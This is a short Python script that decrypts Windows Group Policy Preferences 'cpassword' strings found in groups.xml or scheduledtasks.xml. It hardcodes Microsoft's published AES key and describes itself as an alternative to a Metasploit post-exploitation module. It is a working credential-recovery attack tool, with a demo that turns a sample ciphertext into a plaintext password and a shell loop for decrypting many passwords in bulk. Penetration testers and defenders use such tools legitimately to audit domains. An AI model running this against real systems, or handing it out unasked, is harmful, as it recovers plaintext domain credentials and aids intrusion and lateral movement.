#!/usr/bin/python
# -*- coding: utf8 -*-

import base64
from Crypto.Cipher import AES

#
# This script will allow you to specify an encrypted cpassword string using
# the Microsofts public AES key. This is useful if you don't or can't use the
# GPP post exploitation module. Just paste the cpassword encrypted string found
# in groups.xml or scheduledtasks.xml and it will output the
# decrypted string for you.
#
# Tested Windows Server 2008 R2 Domain Controller.

# Author: Nixawk
#
# http://metasploit.com/modules/post/windows/gather/credentials/gpp
# http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
# http://obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
# http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
# http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)
# http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
# http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx
# https://github.com/rapid7/metasploit-framework/blob/master/tools/password/cpassword_decrypt.rb

# Demo:
# $ python gpp_password_decrypt.py j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
# Local*P4ssword!
#


def decrypt(encrypt_str):

    padding = "=" * (4 - len(encrypt_str) % 4)
    encrypt_str = encrypt_str + padding
    encrypt_str = base64.b64decode(encrypt_str)

    key = ""
    key += "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9"
    key += "\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
    key += "\xf4\x96\xe8\x06\xcc\x05\x79\x90"
    key += "\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"

    iv = "\x00" * 16
    aes_str = AES.new(key, AES.MODE_CBC, iv).decrypt(encrypt_str)

    return aes_str.decode()


if __name__ == "__main__":

    import sys
    if len(sys.argv) != 2:
        print('python {} <gpp_encrypt_password>'.format(sys.argv[0]))
    else:
        print(decrypt(sys.argv[1]))

    # If you want to decrypt passwords from a file;
    # $ for pass in $(cat cp.txt); do python gpp_password_decrypt.py $pass;done
